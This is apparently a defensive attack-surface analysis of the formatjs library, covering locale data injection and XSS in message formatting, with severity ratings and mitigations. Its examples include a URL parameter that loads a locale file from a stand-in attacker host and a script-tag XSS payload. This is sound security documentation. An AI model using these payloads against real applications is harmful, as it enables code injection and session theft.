# Attack Surface Analysis for formatjs/formatjs

## Attack Surface: [Locale Data Injection/Manipulation](./attack_surfaces/locale_data_injectionmanipulation.md)

*   **Description:** Attackers can inject or manipulate locale data used by `formatjs` if the application doesn't properly control the source of this data. This can lead to code execution, denial of service, or information manipulation.

    *   **How formatjs contributes:** `formatjs` relies on external locale data to perform formatting. If the application allows untrusted sources to provide this data, `formatjs` becomes the vehicle for processing potentially malicious content.

    *   **Example:** An application uses a URL parameter `locale` to dynamically load locale data. An attacker crafts a malicious locale file and provides a URL like `?locale=https://attacker.com/malicious_locale.json`. If the application directly loads and uses this data with `formatjs`, malicious scripts within the JSON could be executed.

    *   **Impact:**
        *   **Code Execution:** Malicious JavaScript embedded in injected locale data can execute within the application's context.
        *   **Denial of Service (DoS):**  Large or complex malicious locale data can exhaust resources, causing application crashes or slowdowns.
        *   **Information Manipulation:**  Altered locale data can lead to incorrect or misleading information being displayed to users, potentially enabling social engineering or phishing attacks.

    *   **Risk Severity:** **Critical**

    *   **Mitigation Strategies:**
        *   **Strictly Control Locale Data Source:**  Load locale data exclusively from trusted, internal sources within the application. Never load locale data directly from user-provided URLs or external, untrusted origins.
        *   **Predefined Locale Set (Whitelist):**  Limit the application to a predefined and explicitly whitelisted set of locales.  Avoid dynamic locale loading based on user input.
        *   **Input Validation (If Locale Selection is User-Influenced):** If user input *must* influence locale selection, strictly validate and sanitize the input to ensure it maps to a known and trusted locale identifier, not a file path or URL.
        *   **Content Security Policy (CSP):** Implement a strong CSP to restrict script sources, further mitigating potential code execution from injected locale data, especially in browser environments.

## Attack Surface: [Message Formatting Vulnerabilities (Cross-Site Scripting - XSS)](./attack_surfaces/message_formatting_vulnerabilities__cross-site_scripting_-_xss_.md)

*   **Description:** Improper handling of user-provided data within `formatjs` message formatting can lead to Cross-Site Scripting (XSS) vulnerabilities when formatted messages are rendered in a web context.

    *   **How formatjs contributes:** `formatjs` uses ICU Message Syntax, which allows for embedding variables within messages. If user-controlled input is directly inserted into these variables without proper sanitization and output encoding, it can become a vector for XSS.

    *   **Example:** A message is defined as `messages = { userNameGreeting: "Hello, {username}!" }`. The application takes user input from a form field and directly passes it as the `username` argument to `formatjs.formatMessage`. If a user enters `<script>alert('XSS')</script>` as their username, and the formatted message is rendered in HTML without escaping, the script will execute in the user's browser.

    *   **Impact:**
        *   **Cross-Site Scripting (XSS):** Attackers can execute arbitrary JavaScript code in the context of the user's browser. This can lead to session hijacking, cookie theft, account compromise, website defacement, and redirection to malicious sites.

    *   **Risk Severity:** **High**

    *   **Mitigation Strategies:**
        *   **Strict Input Sanitization:**  Always sanitize and validate user-provided data *before* using it as format arguments in `formatjs` messages. Escape HTML entities or use a robust sanitization library appropriate for the output context (HTML, etc.).
        *   **Output Encoding/Escaping:** When rendering formatted messages in HTML or any context where XSS is a risk, ensure proper output encoding/escaping is applied. Use context-aware escaping functions provided by your framework or templating engine.
        *   **Content Security Policy (CSP):** Implement a strong CSP to further mitigate XSS by controlling the resources the browser is allowed to load and execute, and by restricting inline scripts.
        *   **Principle of Least Privilege for User Input:** Avoid directly using raw user input in message formatting whenever possible. If necessary, process and transform user input into safe representations before using them in `formatjs`.

